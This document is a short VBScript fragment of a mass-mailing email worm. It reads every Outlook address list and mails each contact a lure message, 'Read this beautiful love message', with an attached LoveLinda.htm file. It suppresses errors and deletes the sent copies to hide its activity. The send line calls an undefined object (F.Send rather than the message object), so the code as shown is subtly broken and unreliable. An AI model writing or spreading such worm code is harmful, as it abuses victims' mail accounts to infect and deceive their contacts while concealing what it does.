On Error Resume Next
Set out=CreateObject("Outlook.Application")
Set B=out.GetNameSpace("MAPI")
For Each C In B.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.count
Set em=C.AddressEntries(D)
Set lm=out.CreateItem(0)
lm.To=em.Address
lm.Subject="Love Message..."
lm.Body="Read this beautiful love message."
lm.Attachments.Add("C:\WINDOWS\LoveLinda.htm")
lm.DeleteAfterSubmit=True
If lm.To <> "" Then
F.Send
End If
Next
End If
Next
